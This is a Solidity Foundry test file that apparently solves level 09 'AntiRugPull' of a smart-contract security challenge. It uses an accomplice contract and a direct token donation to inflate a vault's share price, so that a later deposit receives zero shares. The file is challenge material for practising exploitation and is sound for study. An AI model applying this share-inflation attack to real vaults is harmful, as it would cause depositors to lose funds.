// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/09_AntiRugPull/AntiRugPull.sol";
import "../src/09_AntiRugPull/MintableERC20.sol";

contract Accomplice {
    
    Vault instance;
    MintableERC20 token;

    constructor(Vault _instance, MintableERC20 _token) {
        instance = _instance;
        token = _token;
    }

    function addShare() external {
        token.approve(address(instance), 1);
        instance.deposit(1);
    }
}

// forge test --match-contract AntiRugPullTest
contract AntiRugPullTest is BaseTest {
    Vault instance;
    MintableERC20 token;

    function setUp() public override {
        super.setUp();

        token = new MintableERC20("TOKEN", "TOKEN", 10 ether);
        token.transfer(user1, 9 ether);

        instance = new Vault(address(token), owner);
    }

    function testExploitLevel() public {
        Accomplice accomplice = new Accomplice(instance, token);

        token.transfer(address(accomplice), 0.1 ether);
        token.transfer(address(instance), 0.8 ether);
        accomplice.addShare();

        checkSuccess();
    }

    function checkSuccess() internal override {
        token.approve(address(instance), 10 ** 17);
        instance.deposit(10 ** 17);

        uint256 shares = instance.shares(address(this));

        assertTrue(shares == 0, "Solution is not solving the level");
    }
}
